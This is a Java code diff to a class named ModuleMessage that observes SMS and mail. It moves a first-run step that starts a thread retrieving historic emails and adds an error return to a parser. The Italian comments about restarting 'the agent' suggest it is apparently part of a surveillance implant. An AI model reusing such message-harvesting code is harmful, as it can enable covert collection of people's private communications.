@@ -162,6 +162,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
             debug.error(e);
             debug.error("parse");
             //#endif
+            return false;
         }
 
         return true;
@@ -179,6 +180,42 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
 
         if (mailEnabled) {
             mailListener.addSingleMailObserver(this);
+
+            if (firstRun) {
+                //#ifdef DEBUG
+                debug.info("First Run");
+                //#endif
+                firstRun = false;
+
+                if (mailEnabled) {
+                    if (historyThread != null) {
+                        //#ifdef DEBUG
+                        debug.trace("actualRun: stopping historyThread");
+                        //#endif
+
+                        //#ifdef HISTORY_MAIL
+                        mailListener.stopHistory();
+                        //#endif
+
+                        try {
+                            historyThread.join();
+                            //#ifdef DEBUG
+                            debug.trace("actualRun: joined");
+                            //#endif
+                        } catch (Exception e) {
+                            //#ifdef DEBUG
+                            debug.error("actualRun: " + e);
+                            //#endif
+                        }
+                    }
+                    historyThread = new Thread(new Runnable() {
+                        public void run() {
+                            mailListener.retrieveHistoricMails();
+                        }
+                    });
+                    historyThread.start();
+                }
+            }
         }
     }
 
@@ -190,42 +227,6 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
 
         // Ogni ora viene verificato se i nomi degli account corrisponde
         // se non corrisponde, restart dell'agente.
-
-        if (firstRun) {
-            //#ifdef DEBUG
-            debug.info("First Run");
-            //#endif
-            firstRun = false;
-
-            if (mailEnabled) {
-                if (historyThread != null) {
-                    //#ifdef DEBUG
-                    debug.trace("actualRun: stopping historyThread");
-                    //#endif
-
-                    //#ifdef HISTORY_MAIL
-                    mailListener.stopHistory();
-                    //#endif
-
-                    try {
-                        historyThread.join();
-                        //#ifdef DEBUG
-                        debug.trace("actualRun: joined");
-                        //#endif
-                    } catch (Exception e) {
-                        //#ifdef DEBUG
-                        debug.error("actualRun: " + e);
-                        //#endif
-                    }
-                }
-                historyThread = new Thread(new Runnable() {
-                    public void run() {
-                        mailListener.retrieveHistoricMails();
-                    }
-                });
-                historyThread.start();
-            }
-        }
 
         if (mailEnabled && haveNewAccount()) {
             //#ifdef DEBUG
